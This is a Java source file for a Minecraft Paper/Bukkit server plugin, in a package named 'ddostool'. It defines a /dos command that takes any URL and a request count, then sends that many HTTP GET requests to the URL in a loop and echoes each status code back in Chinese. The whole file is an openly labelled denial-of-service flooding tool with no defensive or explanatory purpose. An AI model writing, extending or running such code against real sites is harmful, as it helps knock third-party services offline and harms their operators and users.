package paper.plugin.ddostool;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import cn.hutool.http.HttpUtil;

public class DosCommand implements CommandExecutor{
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length < 2) {
            sender.sendMessage("Usage: /dos <url> <number_of_requests>");
            return false;
        }
        String url = args[0];
        String nrequests = args[1];
        int nrq = Integer.parseInt(nrequests);
        for (int i = 0; i < nrq; i++) {
            String StatusCode = String.valueOf(HttpUtil.createGet(url).execute().getStatus());
            sender.sendMessage("状态码:" + StatusCode);
        }
        return true;
    }

}
